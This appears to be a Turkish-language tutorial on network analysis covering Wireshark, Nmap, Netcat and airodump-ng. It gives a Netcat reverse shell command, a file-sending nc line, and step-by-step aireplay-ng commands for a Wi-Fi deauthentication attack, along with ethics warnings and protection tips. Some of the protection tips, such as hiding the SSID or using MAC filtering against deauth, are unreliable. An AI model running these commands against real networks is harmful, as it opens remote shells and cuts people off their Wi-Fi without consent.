# 📡 Ağları İnceleme (Network Analysis)

Ağları incelemek, ağ trafiğini izlemek, analiz etmek ve güvenlik açıklarını tespit etmek için kullanılan bir süreçtir. Siber güvenlik, penetrasyon testleri ve sistem yönetimi için kritik bir adımdır.

---

## 📌 1️⃣ Ağ İnceleme Yöntemleri
Ağ analizi için farklı teknikler ve araçlar kullanılır. İşte en yaygın yöntemler:

### 🔹 1. Pasif Ağ Analizi
Ağa müdahale etmeden sadece trafiği dinleyerek analiz yapma işlemidir.
- **Sniffing (Paket Dinleme)** yöntemi ile ağdan geçen veriler incelenir.
- **Araçlar:** Wireshark, tcpdump, Tshark, Ettercap

✅ **Kullanım Alanları:**
- Ağ trafiğini izleme
- Anormal veri akışlarını tespit etme
- Olası saldırıları analiz etme

### 🔹 2. Aktif Ağ Analizi
Ağa doğrudan müdahale ederek testler yapma işlemidir.
- Paket enjeksiyonu, tarama ve pentest teknikleri kullanılır.
- **Araçlar:** Nmap, Netcat, Scapy, Nessus

✅ **Kullanım Alanları:**
- Açık portları ve servisleri tespit etme
- Zafiyet tarama ve güvenlik testi yapma
- Ağ güvenlik politikalarını denetleme

---

## 📌 2️⃣ Kullanılan Araçlar ve Teknikler

### 🔍 1. Wireshark (Paket Analizi)
Wireshark, ağ trafiğini yakalayıp analiz etmek için kullanılan en popüler araçlardan biridir.

**Linux'ta Kurulum:**
```bash
sudo apt install wireshark -y
```

**Ağ Trafiği Dinleme:**
```bash
sudo wireshark
```
Wireshark ile HTTP, DNS, TCP, UDP, ICMP paketlerini analiz edebilirsin.

### 🔍 2. Nmap (Ağ Tarama ve Keşif)
Nmap, ağ haritası çıkarmak, açık portları bulmak ve sistem bilgilerini toplamak için kullanılan bir araçtır.

**Linux'ta Kurulum:**
```bash
sudo apt install nmap -y
```

📌 **Tüm açık portları tarama:**
```bash
nmap -p- 192.168.1.1
```

📌 **Ağ üzerindeki cihazları listeleme:**
```bash
nmap -sn 192.168.1.0/24
```

📌 **Hedef sistemde çalışan servisleri tespit etme:**
```bash
nmap -sV 192.168.1.1
```

### 🔍 3. Netcat (Ağ Bağlantı Testi ve Reverse Shell)
Netcat, ağ üzerindeki bağlantıları test etmek ve veri alışverişi yapmak için kullanılır.

📌 **Hedef sistemin açık olup olmadığını kontrol etme:**
```bash
nc -zv 192.168.1.1 80
```

📌 **Hedef sisteme dosya gönderme:**
```bash
nc 192.168.1.1 4444 < dosya.txt
```

📌 **Reverse Shell oluşturma:**
```bash
nc -e /bin/bash 192.168.1.100 4444
```

### 🔍 4. Airodump-ng (Kablosuz Ağ Analizi)
Airodump-ng, Wi-Fi ağlarını analiz etmek, MAC adreslerini ve sinyal seviyelerini görüntülemek için kullanılır.

📌 **Monitor modunu aktif hale getirme:**
```bash
sudo airmon-ng start wlan0
```

📌 **Etraftaki kablosuz ağları listeleme:**
```bash
sudo airodump-ng wlan0mon
```

📌 **Hedef bir ağı izleme:**
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w dump wlan0mon
```

---

## 📌 3️⃣ Ağ Analizi Yaparken Dikkat Edilmesi Gerekenler

🔴 **Etik Kurallar:** Kendi iznin olmayan ağları taramak yasal değildir.
🟢 **Güvenlik Testleri:** Ağ güvenliği testleri için izinli ortamlarda çalışmalısın.
🔴 **Veri Gizliliği:** Ağdaki kullanıcıların kişisel bilgilerini saklamamak ve paylaşmamak gerekir.

---

## 📌 4️⃣ Deauthentication (Deauth) Saldırısı Nedir ve Nasıl Yapılır?

Deauth saldırısı, Wi-Fi ağlarında istemcileri (bağlı cihazları) erişim noktasından (router/modem) koparmak için kullanılan bir saldırı türüdür. 802.11 Wi-Fi protokolündeki zayıflıklardan yararlanarak gerçekleştirilir.

📌 **Kullanım Alanları:**
- **Penetrasyon Testleri:** Ağ güvenliğini test etmek için.
- **Saldırı Senaryoları:** Evil Twin veya Man-in-the-Middle (MitM) saldırılarına zemin hazırlamak için.
- **Ağ Güvenlik Analizi:** Kablosuz ağların savunmasız olup olmadığını belirlemek için.

❗ **Uyarı:** Bu işlem yalnızca kendi ağında veya iznin olan ağlarda yapılmalıdır. Yetkisiz bir ağa saldırmak **yasal değildir**.

### 📌 1️⃣ Deauth Saldırısı İçin Gerekli Araçlar
- Linux işletim sistemi (Kali Linux önerilir)
- Monitor mod destekli Wi-Fi adaptörü
- **Aircrack-ng** aracı (Kablosuz ağ analizi için)

**Linux'ta Aircrack-ng'yi yüklemek için:**
```bash
sudo apt update && sudo apt install aircrack-ng -y
```

### 🔍 2. Deauth Saldırısı Nasıl Yapılır?
📌 **Monitor modunu aktif hale getirme:**
```bash
sudo airmon-ng start wlan0
```

📌 **Ağları tarama ve hedef seçme:**
```bash
sudo airodump-ng wlan0mon
```

📌 **Belirli bir ağı hedefleyerek izleme:**
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w dump wlan0mon
```

📌 **Tüm istemcileri ağdan düşürmek için:**
```bash
sudo aireplay-ng --deauth 1000 -a [Ağ MAC] wlan0mon
```

📌 **Belirli bir cihazı hedef almak için:**
```bash
sudo aireplay-ng --deauth 1000 -a [Ağ MAC] -c [Hedef MAC] wlan0mon
```

---

## 📌 5️⃣ Deauth Saldırısına Karşı Korunma

🛡️ Güçlü **WPA2/WPA3 Şifreleme** kullanın.
🛡️ **MAC Filtreleme ve 802.11w** özelliklerini etkinleştirin.
🛡️ **VPN** kullanarak saldırganların paketleri analiz etmesini zorlaştırın.
🛡️ **Wi-Fi Ağ Adınızı (SSID) Gizleyin.**

---

✅ **Özet:**
- **Wireshark:** Trafik izleme ve analiz
- **Nmap:** Açık portları ve ağ cihazlarını tespit etme
- **Netcat:** Bağlantı testleri ve veri transferi
- **Airodump-ng:** Kablosuz ağları analiz etme

📢 **Etik hackerlar ve siber güvenlik uzmanları için önemli bir bilgi kaynağı!** 🚀

